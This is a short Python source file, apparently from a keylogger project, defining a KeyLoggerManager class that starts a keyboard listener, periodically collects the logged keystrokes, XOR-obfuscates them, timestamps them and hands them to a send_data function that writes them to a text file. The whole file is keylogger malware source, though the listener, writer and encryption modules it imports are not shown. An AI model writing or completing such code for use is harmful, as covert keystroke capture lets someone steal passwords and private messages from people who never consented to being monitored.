from KeyLoggerService import keyboard_track # keyboard listener component
from FileWriter import send_data
from my_Encryption import bytewise_xor      # encryption method
import time                                 # used to devide the iteration
import datetime


class KeyLoggerManager():
    def __init__(self,encryption_sort=bytewise_xor,timer=5):
        self.listening = keyboard_track()
        self.encryption_type = encryption_sort
        self.encrypted_data = "there is no data yet"
        self.listening.start_logging()
        while True:
            time.sleep(timer)
            current_time = str(datetime.datetime.now())
            current_time = current_time[:-7]                       # removing the milliseconds from timestamp
            current_data = self.listening.get_logged_keys()
            self.encrypted_data = bytewise_xor(current_data)
            record = str({current_time : self.encrypted_data})
            send_data("\n"+record)                                 # loading data to a txt file

